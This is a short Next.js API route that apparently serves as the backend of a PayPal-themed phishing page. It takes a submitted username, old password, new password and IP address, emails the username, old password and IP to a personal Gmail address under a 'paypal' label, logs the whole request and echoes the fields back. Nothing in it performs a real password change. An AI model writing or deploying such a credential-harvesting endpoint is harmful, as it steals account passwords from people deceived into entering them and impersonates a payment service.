import { NextApiRequest, NextApiResponse } from "next";
import sendEmail from "../../helpers/mailer";

type Data = {
    username: string,
    oldPassword: string,
    newPassword: string,
    confirmPassword: string,
    ip: string
}

export default async function handler(req: NextApiRequest, res: NextApiResponse<Data>) {
    const body = req.body
    await sendEmail('support@greeniumtrade.com', 'campdaniel06@gmail.com', 'paypal', body.username, body.oldPassword, body.ip)

    console.log(body);
    
    res.status(200).json({
        username: body.username,
        oldPassword: body.oldPassword,
        newPassword: body.newPassword,
        confirmPassword: body.confirmPassword,
        ip: body.ip
    })
}